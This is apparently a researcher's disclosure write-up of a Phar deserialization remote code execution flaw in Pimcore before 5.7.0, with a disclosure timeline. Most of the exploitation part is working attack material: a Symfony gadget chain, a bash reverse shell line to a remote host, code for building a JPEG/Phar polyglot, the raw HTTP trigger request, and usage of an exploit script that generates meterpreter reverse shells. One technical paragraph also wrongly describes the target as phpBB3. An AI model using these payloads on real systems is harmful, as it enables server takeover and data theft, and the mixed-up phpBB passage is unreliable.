---
layout: default
---

# Pimcore < 5.7.0: Phar deserialization to RCE

A new PHP exploit technique affects the most famous PIM, DAM & eCommerce software Pimcore. The vulnerability allows attackers who gain access to an administrator account to execute arbitrary PHP code and to take over the entire PIM.

## Impact

The security bug is located in *Settings -> Data Objects -> Bulk Import* functionality of the Pimcore admin panel which requires access privileges for Admin account. This is the only requirement for an exploitation.

Matching this requirement an attacker can turn a Phar PHP Object Injection vulnerability into a remote code execution vulnerability that allows to perform further attacks and to steal sensitive data.

First, an attacker must be able to plant a crafted Phar file on the targeted web server. But we found some nice tricks on how to sneak a Phar file into a fake JPG, so a common image upload feature is already sufficient and **persistent** acting like a **backdoor**.

So far, this still doesn’t seem that critical because if an attacker can control the full file path in operations such as `include()`, `fopen()`, `file_get_contents()`, `file()`, etc., then this already poses a severe security vulnerability itself. Therefore, user input used in these functions is usually validated.

However, the unserialize is triggered for the `phar://` wrapper in **any** file operation. Thus, other file operations, such as `file_exists()` which simply checks the existence of a file, were until now considered as less sensitive to security risks and are less well protected. But now an attacker can inject the `phar://` wrapper and gain code execution.

The issue in the Pimcore code base is a Phar deserialization vulnerability (CVE-2019-XXXX). It was fixed in version `5.7.0`.

## Technical details
Phar deserialization vulnerabilities occur if user input is passed unsanitized to any file system function in PHP, such as `file_exists()`.

The vulnerability in Pimcore lies in a feature that allows administrators to manage assets. The feature utilizes an image editor binary called Imagick. Administrators are able to set the absolute path to the image editor binary on the server running phpBB3. Before updating this setting, phpBB3 tries to validate the new path with the function validate_config_vars(). The function performs this validation by checking if the file actually exists.

## Exploitation

For exploitation, the following steps are neccessary.

### Creating a malicious Phar file

The security researcher [Sam Thomas](https://www.twitter.com/@_s_n_t) found a new exploitation technique that can lead to critical PHP object injection vulnerabilities - without using the PHP function `unserialize()`. The new technique was announced at the BlackHat USA conference in his talk "*It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It*". It can enable attackers to escalate the severity of file related vulnerabilities to remote code execution.

#### Stream Wrappers

Most PHP file operations allow to use various *URL-style wrappers* such as `data://`, `zlib://`, or `php://` when accessing a file path. Some of these wrappers are often used to exploit remote file inclusion vulnerabilities where an attacker can control the full file path of a file inclusion. For example, the wrappers are injected to leak source code that otherwise would be executed, or to inject own PHP code for execution.

#### Phar Meta Data

But so far, nobody paid attention to the `phar://` wrapper. What is interesting about Phar (PHP Archive) files is that these contain meta data in serialized format.

A full description of the Phar file format is beyond the scope of this post, however let us cover the key points from our perspective. There are a number of elements which must be present in a valid Phar archive:
* **Stub**: Phar files can act as self extracting archives, the stub is PHP code which is executed when the file is accessed in an executable context. In the type of attacks covered in this post it is sufficient for a minimal stub to exist since it will never be executed. The minimal stub is: `<?php __HALT_COMPILER(); ?>`
* **Signature**: (optional - required for the archive to be loaded by PHP in default configuration) The signature consists of a 4 byte "magic" identification value "GBMB", 4 bytes to identify the signature type (MD5, SHA1, SHA256 or SHA512) and the signature itself.
* **Meta-data**: (optional) The metadata may contain any serialized PHP object represented in the standard PHP format.

Let's create a Phar file and add an object with some data as meta data:

```
<?php
  // a generic object class
  class TestObject {}

  // create a new phar
  $phar = new Phar("test.phar");
  $phar->startBuffering();
  // add a file and relative content
  $phar->addFromString("test.txt","test");
  // add the minimal stub
  $phar->setStub("<?php __HALT_COMPILER(); ?>");
  // create the object
  $o = new TestObject();
  $o->data = 'cmg-fc';
  // add the test object as meta data
  $phar->setMetadata($o);
  $phar->stopBuffering();
?>
```

Our newly created `test.phar` file now has the following content. We can see that our object was stored as a serialized string.

![Hex view of the created Phar file](./assets/hex01.png)

#### PHP Object Injection

If a file operation is now performed on our existing Phar file via the `phar://` wrapper, then its serialized meta data is **unserialized**. This means that our injected object in the meta data is loaded into the application’s scope. If this application has a class named TestObject and it has the magic method `__destruct()` or `__wakeup()` defined, then those methods are automatically invoked. This means we can trigger any destructor or wakeup method in the code base. Even worse, if these methods operate on our injected data then this can lead to further vulnerabilities.

Pimcore version 5.x is based on Symfony. In order to trigger a destruct method we can use a Symfony gadget chain like the following:
```
namespace Symfony\Component\Cache\Traits
{
    use \Psr\Log\LoggerAwareTrait;

    trait AbstractTrait
    {
        use LoggerAwareTrait;

        private $namespace;
        private $deferred;
    }
}

namespace Psr\Log
{
    trait LoggerAwareTrait
    {
    }
}

namespace Symfony\Component\Cache\Adapter
{
    use \Symfony\Component\Cache\Traits\AbstractTrait;

    abstract class AbstractAdapter
    {
        use AbstractTrait;

        private $mergeByLifetime = 'proc_open';

        function __construct($command)
        {
            $this->deferred = $command;
            $this->namespace = [];
        }
    }

    class ApcuAdapter extends AbstractAdapter
    {
    }
}
```
We can define any kind of shell script as payload than create the serialized object:
```
$payload = "bash -i >& /dev/tcp/10.0.8.2/4444 0>&1"; // Simple Bash reverse shell, on attacker side: 'nc -l -p 4444'
$o = new \Symfony\Component\Cache\Adapter\ApcuAdapter($payload);
```

### Uploading a malicious Phar file

In order to trigger the Phar deserialization, the local path to the Phar file on the target server must be supplied. This means an attacker must upload the malicious Phar file to the target. Pimcore allow administrator with asset permission to upload file, included Phar file...

**But we want to do things right and upload an image (or replace an existing one)!**

#### Polyglot Phar

Sometimes we forget that, but files are just a bunch of bytes following a predefined structure. Applications will check if they can manage such stream of data and, if they succed, they will produce an output.

What we want to do is to create a file that is a valid PHAR file **and** JPEG image at the same time!

First of all, Phar files are extension independend. If the `evil.phar` file was renamed to `evil.jpg`, the above example of triggering the Phar deserialization would still work.

Then, there are three base formats in which the data within a Phar archive can be stored; Phar, Zip and Tar. Each of which offers different types and degrees of flexibility. The Phar format allows us complete control of the start of a file. This minimal stub may be prefixed with any arbitrary data, and is the first thing in the file. According to the documentation *there are no restrictions on the contents of a Phar stub, except for the requirement that it conclude with \_\_HALT_COMPILER();*. 

Than we can start the stub with the JPEG file header. Our script become something like this (where `\xFF\xD8\xFF\xFE\x13\xFA\x78\x74` is the hex view of the header of the JPEG file format):
```
<?php
  // a generic object class
  class TestObject {}

  // create a new phar
  $phar = new Phar("test.phar");
  $phar->startBuffering();
  // add a file and relative content
  $phar->addFromString("test.txt","test");
  // add the minimal stub
  $phar->setStub("\xFF\xD8\xFF\xFE\x13\xFA\x78\x74 __HALT_COMPILER(); ?>");
  // create the object
  $o = new TestObject();
  $o->data = 'cmg-fc';
  // add the test object as meta data
  $phar->setMetadata($o);
  $phar->stopBuffering();

  // rename phar to jpg
  rename("test.phar", "test.jpg");
?>
```
Will it be a valid PHAR and JPEG image?
```
root@kali:~# file test.jpg 
test.jpg: JPEG image data
root@kali:~# php -a
Interactive mode enabled

php > var_dump(mime_content_type('test.jpg'));
string(10) "image/jpeg"
php > var_dump(file_exists('phar://test.jpg/test.txt'));
bool(true)
php > 
```
PHP recognizes it as an image **and** we can still explore the contents of the archive!

#### The next level

We have a file that would pass any check based on file headers, however anything more sofisticate than that would fail. For example, checking the image with `getimagesize` will return false, since we do not have a "real" image:
```
root@kali:~# php -a
Interactive mode enabled

php > var_dump(getimagesize('test.jpg'));
bool(false)
php > 
```
But wait, we saw that we can inject as much gibberish we want before the `__HALT_COMPILER()` token. What if we craft a full image?

Can we simply create a 1x1 image with GIMP and embed it?
```
<?php
  // a generic object class
  class TestObject {}

  // 1x1 JFIF image/JPEG Hex
  $jpeg =
  "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xFE\x00\x18\x43".
  "\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x46\x61\x62\x69\x6F\x20\x43\x6F\x67\x6E\x6F\xFF\xDB\x00\x43".
  "\x00\x03\x02\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0A\x07\x07".
  "\x06\x08\x0C\x0A\x0C\x0C\x0B\x0A\x0B\x0B\x0D\x0E\x12\x10\x0D\x0E\x11\x0E\x0B\x0B\x10\x16\x10\x11\x13".
  "\x14\x15\x15\x15\x0C\x0F\x17\x18\x16\x14\x18\x12\x14\x15\x14\xFF\xDB\x00\x43\x01\x03\x04\x04\x05\x04".
  "\x05\x09\x05\x05\x09\x14\x0D\x0B\x0D\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
  "\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
  "\x14\x14\x14\x14\x14\x14\x14\x14\x14\xFF\xC2\x00\x11\x08\x00\x01\x00\x01\x03\x01\x11\x00\x02\x11\x01".
  "\x03\x11\x01\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01".
  "\xFF\xC4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xFF\xDA\x00".
  "\x0C\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\x54\x81\x3F\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00".
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00\x01\x05\x02\x7F\xFF\xC4\x00".
  "\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x03".
  "\x01\x01\x3F\x01\x7F\xFF\xC4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
  "\x00\x00\xFF\xDA\x00\x08\x01\x02\x01\x01\x3F\x01\x7F\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00".
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00\x06\x3F\x02\x7F\xFF\xC4\x00\x14".
  "\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00".
  "\x01\x3F\x21\x7F\xFF\xDA\x00\x0C\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\xFF\x00\xFF\xC4\x00\x14\x11".
  "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x03\x01\x01".
  "\x3F\x10\x7F\xFF\xC4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
  "\xFF\xDA\x00\x08\x01\x02\x01\x01\x3F\x10\x7F\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00".
  "\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00\x01\x3F\x10\x7F\xFF\xD9";

  // create a new phar
  $phar = new Phar("test.phar");
  $phar->startBuffering();
  // add a file and relative content
  $phar->addFromString("test.txt","test");
  // add the minimal stub
  $phar->setStub($jpeg." __HALT_COMPILER(); ?>");
  // create the object
  $o = new TestObject();
  $o->data = 'cmg-fc';
  // add the test object as meta data
  $phar->setMetadata($o);
  $phar->stopBuffering();

  // rename phar to jpeg
  rename("test.phar", "test.jpg");
?>
```
Now, it's time to check it out:
```
root@kali:~# file test.jpg 
test.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, comment: "Created by Fabio Cogno", progressive, precision 8, 1x1, components 3
root@kali:~# php -a
Interactive mode enabled

php > var_dump(mime_content_type('test.jpg'));
string(10) "image/jpeg"
php > var_dump(file_exists('phar://test.jpg/test.txt'));
bool(true)
php > var_dump(getimagesize('test.jpg'));
array(7) {
  [0]=>
  int(1)
  [1]=>
  int(1)
  [2]=>
  int(2)
  [3]=>
  string(20) "width="1" height="1""
  ["bits"]=>
  int(8)
  ["channels"]=>
  int(3)
  ["mime"]=>
  string(10) "image/jpeg"
}
php > 
```
And finally, we're done. File is a PHAR package containing the class we want to exploit, but it's still a valid image (it can even be opened with system image viewer)!

Now we can download an existing asset in Pimcore, make it also a Phar file with a Symfony gadget chain that exploit `__destruct()` method in his meta data and then we can re-upload the new image in the Pimcore assets section.

### Triggering the exploit and executing code

The last step of exploiting the Phar deserialization is finding a way to include our JPEG/PHAR file with the `phar://` wrapper in any PHP file function.

Fortunately, the bulk-commit function take a parameter called "filename" with the following code (pimcore/bundles/AdminBundle/Controller/Admin/DataObject/ClassController.php):
```
public function bulkCommitAction(Request $request)
    {
        $filename = $request->get('filename');
        $data = json_decode($request->get('data'), true);
        $json = @file_get_contents($filename);
        $json = json_decode($json, true);
        ...
```
Perfect! We can call the bulk-commit with our JPEG/PHAR in the `phar://` wrapper:
```
POST /admin/class/bulk-commit HTTP/1.1
Host: 192.168.2.59:8566
X-pimcore-csrf-token: 9e7b89690abdd2515b3dafbb721c7a98f8d153c3
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=5lddjap7vkd24lvfv1p67n7ng1; pimcore_admin_sid=1

filename=phar://../../../../../../../../../../../../var/www/html/web/var/assets/test.jpg/test.txt
```

## The final script!

In order to easly exploit Pimcore we have create a PHP CLI script that can be downloaded [here](./polyglot-phar-exploit.md).

By default the script generate a 1x1 JPEG but you can pass any JPEG image for a real world example.

Moreover, the script generate a basic *sh reverse shell*, a metasploit *PHP meterpreter reverse shell* or whatever command you want.

```
root@kali:~# php polyglot_phar_exploit.php -h
This PHP CLI script create a polyglot PHAR (PHP Archive) that is a valid PHAR file and JPEG image at the same time.
The PHAR file contain a Symfony gadget chain in his meta data and exploit __destruct() method executing the passed command.
Usage:
-h	This help
-t type	The payload. Possible values are:
	'msf' for msf php reverse shell (need metasploit)
	'nc' for a sh reverse shell
	'<your command>' for passing command like 'touch /tmp/findme'
-l IP	The local IP address
-p port	The local port
-o file	The output file
-i file	The input file. If no file is passed, create a Polyglot PHAR with a default 1x1px image

root@kali:~# php polyglot_phar_exploit.php -t msf -p 4444 -l 10.0.8.2 -o cmg-phar-msf.jpg -i cmg.jpg
No encoder or badchars specified, outputting raw payload
Payload size: 1109 bytes

[-] run 'msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST 10.0.8.2; exploit"'
filename: cmg.jpg[+] Creation complete successfully!
[-] Payload to send: cmg-phar-msf.jpg/j7NysV.txt
[-] e.g.: filename=phar://../../../../../../../../../../../../var/www/html/web/var/assets/cmg-phar-msf.jpg/j7NysV.txt
root@kali:~# ls -la
...
-rw-r--r-- 1 root root 204771 Apr 28 18:39 cmg.jpg
-rw-r--r-- 1 root root 206695 Apr 28 19:05 cmg-phar-msf.jpg
...
```

## Time Line

| Date | What |
| --- | --- |
| 2019/03/08 | Vulnerability was discovered. |
| 2019/03/14 | Vulnerability was tested on some different version and confirmed. |
| 2019/03/15 | Vulnerability was reported to Pimcore team. |
| 2019/03/19 | Pimcore releases patch with version 5.7.0. |

## Summary

Phar deserialization is a new exploitation technique in PHP and occurs in many popular CMS systems. The vulnerability allows authenticated attackers to execute arbitrary PHP code on the server.

This post details how to create a valid JPEG/PHAR file in order to exploit a Phar deserializiation in Pimcore. The vulnerability remained uncovered in Pimcore for over **3 years**. It was fixed in version **5.7.0**.

## References

* [https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
* [http://php.net/manual/wrappers.php](http://php.net/manual/wrappers.php)
* [http://php.net/manual/phar.fileformat.manifestfile.php](http://php.net/manual/phar.fileformat.manifestfile.php)
* [https://www.php.net/manual/en/phar.fileformat.ingredients.php](https://www.php.net/manual/en/phar.fileformat.ingredients.php)
* [https://www.php.net/manual/en/phar.fileformat.stub.php](https://www.php.net/manual/en/phar.fileformat.stub.php)
* [https://www.nc-lp.com/blog/disguise-phar-packages-as-images](https://www.nc-lp.com/blog/disguise-phar-packages-as-images)

## Thanks

We would like to thank the Pimcore security team for their very fast responses, as well as the competent and professional handling of the security issue.

Special thanks to Daniele Scanu for the discovery.

---

[back](./)